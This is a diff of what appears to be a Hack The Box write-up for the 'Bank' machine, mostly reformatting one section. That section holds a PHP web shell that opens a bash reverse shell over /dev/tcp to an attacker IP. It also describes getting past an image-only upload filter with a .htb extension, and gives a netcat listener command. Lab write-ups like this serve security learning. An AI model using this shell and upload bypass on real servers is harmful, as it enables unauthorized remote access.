@@ -58,11 +58,15 @@ I added http://bank.htb/login.php to the noredirect plugin so it would stop redi
 > “<! — [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] →”
 
 I created a php shell as followed
-
+```
 <?php
 exec(“/bin/bash -c ‘bash -i >& /dev/tcp/10.10.x.x/4444 0>&1’”);
+```
+and named it shell.php I tried uploading it as shell.php but the site only wanted images uploaded. 
+Then I remember that .htb runs as php so I added the .htb extension for my php shell since it can execute as php “for debugging purposes” and the shell got uploaded. Now all I had to do is set up a netcat listener to catch the shell.
 
-and named it shell.php I tried uploading it as shell.php but the site only wanted images uploaded. Then I remember that .htb runs as php so I added the .htb extension for my php shell since it can execute as php “for debugging purposes” and the shell got uploaded. Now all I had to do is set up a netcat listener to catch the shell. `nc -l -v -p 4444`
+`nc -l -v -p 4444`
+
 once we catch the shell we go into the box as `www-data` in the directory `/var/www/bank/uploads/`
 
 `www-data@bank:/var/www/bank/uploads$`
